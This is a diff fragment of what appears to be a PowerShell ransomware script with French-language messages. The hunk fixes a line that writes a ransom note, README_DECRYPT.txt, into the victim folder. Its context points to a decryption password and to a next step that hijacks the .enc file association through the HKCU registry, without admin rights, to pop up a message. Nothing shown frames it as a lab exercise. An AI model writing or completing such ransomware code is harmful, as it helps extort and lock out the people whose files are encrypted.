@@ -53,7 +53,7 @@ Lancez le script de dechiffrement et entrez le mot de passe.
 "@
 
 $utf8Bom = New-Object System.Text.UTF8Encoding $true
-[System.IO.File]::WriteAllText("$folder\README_DECRYPT.txt", $ransom, $utf8Bom)Write-Host ""
+[System.IO.File]::WriteAllText("$folder\README_DECRYPT.txt", $ransom, $utf8Bom)
 Write-Host "Note de rancon creee : README_DECRYPT.txt"
 
 # --- ASSOCIATION .enc -> POPUP (registre HKCU, sans admin) ---
